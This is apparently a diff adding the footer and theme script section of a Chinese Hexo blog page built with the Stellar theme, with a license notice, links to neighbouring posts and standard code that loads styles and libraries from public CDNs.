+<div class="article-footer reveal fs14"><section id="license"><div class="header"><span>许可协议</span></div><div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
+</div></section></div>
+
+</article>
+
+<div class="related-wrap reveal" id="read-next"><section class="header cap theme"><span>接下来阅读</span></section><section class="body fs14"><a id="next" href="/rin-egg/">铃酱的盒蛋终于到了<span class="note">较早</span></a><div class="line"></div><a id="prev" href="/regular-match/">正则匹配<span class="note">较新</span></a><div class="line"></div><a id="more" href="/blog/archives">检索全部文章</a></section></div>
+
+
+
+
+
+
+
+
+      
+<footer class="page-footer reveal fs12"><hr><div class="text"><p>本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
+<p>本站由 <a href="https://github.com/RinChanNOWWW/">@RinChanNOW</a> 创建，使用 <a href="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.5.0" title="v1.5.0">Stellar</a> 作为主题。</p>
+</div></footer>
+
+      <div class='float-panel mobile-only blur' style='display:none'>
+  <button type='button' class='sidebar-toggle mobile' onclick='sidebar.toggle()'>
+    <svg class="icon" style="width: 1em; height: 1em;vertical-align: middle;fill: currentColor;overflow: hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="15301"><path d="M566.407 808.3c26.9-0.1 49.3-20.8 51.6-47.6-1.9-27.7-23.9-49.7-51.6-51.6h-412.6c-28.2-1.4-52.6 19.5-55.5 47.6 2.3 26.8 24.6 47.5 51.6 47.6h416.5v4z m309.3-249.9c26.9-0.1 49.3-20.8 51.6-47.6-2.2-26.8-24.6-47.5-51.6-47.6h-721.9c-27.7-2.8-52.5 17.4-55.3 45.1-0.1 0.8-0.1 1.7-0.2 2.5 0.9 27.2 23.6 48.5 50.7 47.6H875.707z m-103.1-245.9c26.9-0.1 49.3-20.8 51.6-47.6-0.4-28.3-23.2-51.1-51.5-51.6h-618.9c-29.5-1.1-54.3 21.9-55.5 51.4v0.2c1.4 27.8 25.2 49.2 53 47.8 0.8 0 1.7-0.1 2.5-0.2h618.8z" p-id="15302"></path><path d="M566.407 808.3c26.9-0.1 49.3-20.8 51.6-47.6-1.9-27.7-23.9-49.7-51.6-51.6h-412.6c-28.2-1.4-52.6 19.5-55.5 47.6 1.9 27.7 23.9 49.7 51.6 51.6h416.5z m309.3-249.9c26.9-0.1 49.3-20.8 51.6-47.6-2.2-26.8-24.6-47.5-51.6-47.6h-721.9c-27.7-2.8-52.5 17.4-55.3 45.1-0.1 0.8-0.1 1.7-0.2 2.5 0.9 27.2 23.6 48.5 50.7 47.6H875.707z m-103.1-245.9c26.9-0.1 49.3-20.8 51.6-47.6-0.4-28.3-23.2-51.1-51.5-51.6h-618.9c-29.5-1.1-54.3 21.9-55.5 51.4v0.2c1.4 27.8 25.2 49.2 53 47.8 0.8 0 1.7-0.1 2.5-0.2h618.8z" p-id="15303"></path></svg>
+  </button>
+</div>
+
+    </div>
+  </div>
+  <div class='scripts'>
+    <script type="text/javascript">
+  stellar = {
+    // 懒加载 css https://github.com/filamentgroup/loadCSS
+    loadCSS: (href, before, media, attributes) => {
+      var doc = window.document;
+      var ss = doc.createElement("link");
+      var ref;
+      if (before) {
+        ref = before;
+      } else {
+        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
+        ref = refs[refs.length - 1];
+      }
+      var sheets = doc.styleSheets;
+      if (attributes) {
+        for (var attributeName in attributes) {
+          if (attributes.hasOwnProperty(attributeName)) {
+            ss.setAttribute(attributeName, attributes[attributeName]);
+          }
+        }
+      }
+      ss.rel = "stylesheet";
+      ss.href = href;
+      ss.media = "only x";
+      function ready(cb) {
+        if (doc.body) {
+          return cb();
+        }
+        setTimeout(function () {
+          ready(cb);
+        });
+      }
+      ready(function () {
+        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
+      });
+      var onloadcssdefined = function (cb) {
+        var resolvedHref = ss.href;
+        var i = sheets.length;
+        while (i--) {
+          if (sheets[i].href === resolvedHref) {
+            return cb();
+          }
+        }
+        setTimeout(function () {
+          onloadcssdefined(cb);
+        });
+      };
+      function loadCB() {
+        if (ss.addEventListener) {
+          ss.removeEventListener("load", loadCB);
+        }
+        ss.media = media || "all";
+      }
+      if (ss.addEventListener) {
+        ss.addEventListener("load", loadCB);
+      }
+      ss.onloadcssdefined = onloadcssdefined;
+      onloadcssdefined(loadCB);
+      return ss;
+    },
+
+    // 从 butterfly 和 volantis 获得灵感
+    loadScript: (src, opt) => new Promise((resolve, reject) => {
+      var script = document.createElement('script');
+      script.src = src;
+      if (opt) {
+        for (let key of Object.keys(opt)) {
+          script[key] = opt[key]
+        }
+      } else {
+        // 默认异步，如果需要同步，第二个参数传入 {} 即可
+        script.async = true
+      }
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    }),
+
+    // https://github.com/jerryc127/hexo-theme-butterfly
+    jQuery: (fn) => {
+      if (typeof jQuery === 'undefined') {
+        stellar.loadScript(stellar.plugins.jQuery).then(fn)
+      } else {
+        fn()
+      }
+    }
+  };
+  stellar.github = 'https://github.com/xaoxuu/hexo-theme-stellar/tree/1.5.0';
+  stellar.config = {
+    date_suffix: {
+      just: '刚刚',
+      min: '分钟前',
+      hour: '小时前',
+      day: '天前',
+      month: '个月前',
+    },
+  };
+
+  // required plugins (only load if needs)
+  stellar.plugins = {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js',
+    sitesjs: '/js/plugins/sites.js',
+    friendsjs: '/js/plugins/friends.js',
+  };
+
+  // optional plugins
+  if ('true' == 'true') {
+    stellar.plugins.lazyload = Object.assign({"enable":true,"js":"https://cdn.jsdelivr.net/npm/vanilla-lazyload@17.3.1/dist/lazyload.min.js","transition":"blur"});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.swiper = Object.assign({"enable":true,"css":"https://unpkg.com/swiper/swiper-bundle.min.css","js":"https://unpkg.com/swiper/swiper-bundle.min.js"});
+  }
+  if ('' == 'true') {
+    stellar.plugins.scrollreveal = Object.assign({"enable":null,"js":"https://cdn.jsdelivr.net/npm/scrollreveal@4.0.9/dist/scrollreveal.min.js","distance":"8px","duration":500,"interval":100,"scale":1});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.preload = Object.assign({"enable":true,"service":"flying_pages","instant_page":"https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@4.1.2/js/instant_page.js","flying_pages":"https://cdn.jsdelivr.net/gh/gijo-varghese/flying-pages@2.1.2/flying-pages.min.js"});
+  }
+</script>
+
+<!-- required -->
+
+  
+<script src="/js/main.js" async></script>
+
+
+
+<!-- optional -->
+
+
+
+<!-- inject -->
+
+
+  </div>
+</body>
+</html>
